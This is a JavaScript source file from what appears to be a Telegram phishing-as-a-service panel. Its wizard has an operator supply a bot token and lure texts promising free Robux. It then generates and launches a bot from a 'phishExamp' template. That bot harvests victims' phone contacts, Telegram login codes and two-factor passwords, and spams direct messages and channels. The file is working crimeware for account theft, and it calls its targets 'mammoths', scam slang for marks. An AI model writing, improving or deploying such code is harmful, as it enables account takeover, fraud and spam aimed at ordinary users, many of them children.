const { Scenes: { WizardScene }, Telegraf } = require("telegraf");
const { ref, get, child, set, update } = require("firebase/database");

const axios = require("axios");
const db = require("../database");
const createConfig = require("../botCreatingTools/createConfig");
const createBot = require("../botCreatingTools/createBot");
const cmdWorking = require("../botCreatingTools/cmdWorking");
const fs = require("fs");

function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}

const keyboard = {
    keyboard: [[{text: "👨🏼‍💻Ваш профиль"}], [{text: "Информация"}, {text: "Топ воркеров"}, {text: "Создать бота"}]],
    resize_keyboard: true
}

const createBotScene = new WizardScene("createBotScene",
    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state = {};

        ctx.scene.state.worker_id = ctx.chat.id;
        ctx.scene.state.botToken = ctx.message.text;

        try {
            await axios.get(`https://api.telegram.org/bot${ctx.message.text}/getMe`);
        }
        catch {
            await ctx.reply("Токен бота невалид.", {reply_markup: keyboard})
            return ctx.scene.leave();
        }

        await ctx.reply("Вы попали в настройку текста бота!\nВведите текст кнопки отправки контакта.\n\nПример: \"Получить робуксы\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.authorizationButtonText = ctx.message.text;

        await ctx.reply("Текст кнопки успешно задан!\nВведите текст при /start.\n\nПример: \"Хочешь получить робуксы бесплатно? Нажимай на кнопку ниже!\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.startText = ctx.message.text;

        await ctx.reply("Текст команды успешно задан!\nВведите текст подключения\n\nПример: \"Подключаемся к серверам роблокса..\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.connectionText = ctx.message.text;

        await ctx.reply("Текст подключения успешно задан!\nВведите текст ввода кода\n\nПример: \"Введите код, который вам пришёл от телеграмма(проверьте чаты)\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.codeText = ctx.message.text;

        await ctx.reply("Текст ввода кода успешно задан!\nВведите текст при вводе неверного кода\n\nПример: \"Вы ввели неверный код! Проверьте чаты.\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.invalidCodeErrorText = ctx.message.text;

        await ctx.reply("Текст ввода неверного кода успешно задан!\nВведите текст при вводе верного кода\n\nПример: \"Роблоксы будут выданы через 24 часа. Введите ваш ник в игре\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.validCodeText = ctx.message.text;

        await ctx.reply("Текст ввода верного кода успешно задан!\nВведите текст при неудаче отправки кода(рейтлимиты аккаунта мамонта)\n\nПример: \"На ваш аккаунт нельзя получить робуксы!\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.errorSendCodeText = ctx.message.text;

        await ctx.reply("Текст ввода при неудаче отправки кода(рейтлимиты аккаунта мамонта) задан!\nВведите текст при установленном 2фа\n\nПример: \"Введите ваш пароль 2фа: \"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.passwordNeedErrorText = ctx.message.text;

        await ctx.reply("Текст ввода при установленном 2фа задан!\nВведите текст при неверном введёном 2фа\n\nПример: \"Пароль введён неверно! Попробуйте ещё раз\"");
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.invalidPasswordError = ctx.message.text;

        await ctx.reply("Текст ввода при неверном вводе 2фа задан!\n\nНачалась настройка рассылки!\nВведите текст рассылки\nПример: \"Хочешь получить бесплатные робуксы? Пиши этому боту @test\"")
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.spamText = ctx.message.text;
        ctx.dmSpam = true;

        await ctx.reply("Текст ввода при спаме задан!\nВведите ссылки на каналы для вступления через, если не желаете вводить, то введите 0\",\"\nПример: \"https://t.me/RobloxXO,https://t.me/RobloxXO\"")
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        ctx.scene.state.joinChannels = ctx.message.text.split(",");

        await ctx.reply("Текст ввода при каналы для вступления заданы!\nВведите айдишники каналов для спама, получить айдишники можно тут @getmy_idbot, если не желаете вводить, то введите 0\nПример: \"-1001612518469,-1001612518469\"")
        return ctx.wizard.next();
    },

    async (ctx) => {
        if(ctx.message?.text == undefined) return;

        if(fs.existsSync(`./bots/${ctx.chat.id}`)) fs.writeFileSync(`./bots/${ctx.chat.id}/stop.stop`, "besttem");
        await sleep(1000);

        ctx.scene.state.channelsSpam = ctx.message.text.split(",");

        await ctx.reply("Поздравляю! Вы успешно всё настроили! Удачного ворка 🍀", {reply_markup: keyboard})
        await set(child(ref(db), `users/${ctx.chat.id}/bot`),
            {
                worker_id: ctx.scene.state.worker_id,
                botToken: ctx.scene.state.botToken,
                textInfo:
                    {
                        authorizationButtonText: ctx.scene.state.authorizationButtonText,
                        startText: ctx.scene.state.startText,
                        connectionText: ctx.scene.state.connectionText,
                        codeText: ctx.scene.state.codeText,
                        errorSendCodeText: ctx.scene.state.errorSendCodeText,
                        validCodeText: ctx.scene.state.validCodeText,
                        invalidCodeErrorText: ctx.scene.state.invalidCodeErrorText,
                        passwordNeedErrorText: ctx.scene.state.passwordNeedErrorText,
                        invalidPasswordError: ctx.scene.state.invalidPasswordError
                    },
                spamInfo:
                    {
                        joinChannels: ctx.scene.state.joinChannels,
                        channelsSpam: ctx.scene.state.channelsSpam,
                        dmSpam: true,
                        spamText: ctx.scene.state.spamText
                    }
            }
        );

        const user_bot_data = await get(child(ref(db), `users/${ctx.chat.id}/bot`));
        const user_bot = user_bot_data.val();

        const path = `./bots/${ctx.chat.id}`;

        fs.existsSync(path) || fs.mkdirSync(path);

        try {
            fs.unlinkSync(`${path}/stop.stop`);
        }
        catch {
            console.log("catch");
        }

        ctx.scene.leave();

        const config = createConfig(user_bot.botToken,user_bot.worker_id, user_bot.spamInfo, user_bot.textInfo);
        createBot(config, path, "./phishExamp");
        cmdWorking(`cd ${path} & python bot.py`);
    }
)

createBotScene.hears("Вернуться", async (ctx) => {
    await ctx.reply("Вы вернулись в панель!", {reply_markup: keyboard})
    return ctx.scene.leave();
})

createBotScene.enter((ctx) => {
    ctx.reply("Вы попали в создание бота!\n\nВведите токен бота: ", {reply_markup: {keyboard: [[{text: "Вернуться"}]], resize_keyboard: true}})
})

module.exports = createBotScene;